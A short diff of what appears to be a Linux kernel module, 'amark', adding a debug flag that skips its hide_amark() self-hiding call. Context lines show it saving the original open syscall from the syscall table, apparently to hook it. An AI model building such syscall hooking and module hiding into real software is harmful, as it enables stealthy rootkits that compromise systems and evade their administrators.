@@ -5,6 +5,8 @@
 
 MODULE_LICENSE("GPL");
 
+#define __DEBUG__ (true)
+
 typedef void (*sys_call_ptr_t)(void);
 typedef asmlinkage long (*orig_open_t)(const char __user *filename, int flags, int mode);
 
@@ -78,7 +80,8 @@ static int __init amark_init(void) {
         return 0;
     }
 
-    hide_amark();
+    if (!__DEBUG__)
+      hide_amark();
 
     orig_open = (orig_open_t) _sys_call_table[__NR_open];
 
